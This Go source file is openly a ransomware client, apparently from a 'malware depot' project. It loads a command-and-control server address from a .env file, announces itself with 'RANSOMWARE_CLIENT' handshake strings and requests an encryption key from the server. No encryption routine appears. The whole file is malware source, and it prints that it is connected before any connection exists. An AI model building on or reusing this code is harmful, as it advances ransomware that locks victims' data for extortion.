package main

import (
	"fmt"
	"log"
	"net"
	"os"

	"github.com/joho/godotenv"
)

// Connect to the server and obtain a connection object(net.Conn)
func obtainServerSocketConnection() net.Conn {
	// Setup server connection information
	protocol := os.Getenv("PROTOCOL")
	serverAddress := os.Getenv("SERVER_ADDRESS")
	serverPort := os.Getenv("SERVER_PORT")
	serverURL := serverAddress + ":" + serverPort

	// Establish a single connection to the server
	serverConnection, err := net.Dial(protocol, serverURL)
	if err != nil {
		log.Panicf("Error connecting to the server: %v", err.Error())
	}

	return serverConnection
}

// Function to receive data from the server
func receiveDataFromServer(serverConnection net.Conn) {
	buffer := make([]byte, 1024)
	_, err := serverConnection.Read(buffer)
	fmt.Printf("Server says: %s", string(buffer))

	// If the given error is EOF, then the server has closed the connection
	if err != nil {
		if err.Error() == "EOF" {
			fmt.Println("Server has closed the connection")
			return
		}
		log.Panicf("Error reading: %v", err.Error())
	}
}

// Function to send data to the server
func sendDataToServer(serverConnection net.Conn, message string) {
	_, err := serverConnection.Write([]byte(message))
	if err != nil {
		log.Panicf("Error writing: %v", err.Error())
	}
}

func main() {
	// Load .env file
	err := godotenv.Load()
	if err != nil {
		log.Panicf("Error loading .env file: %v", err.Error())
	}

	var serverConnection net.Conn

	fmt.Println("Connected to the C&C Server")

	// Establishing connection to the server
	serverConnection = obtainServerSocketConnection()
	sendDataToServer(serverConnection, "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION")
	receiveDataFromServer(serverConnection)
	serverConnection.Close()

	// Receive an encryption key from the server
	serverConnection = obtainServerSocketConnection()
	sendDataToServer(serverConnection, "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY")
	receiveDataFromServer(serverConnection)
	serverConnection.Close()
}
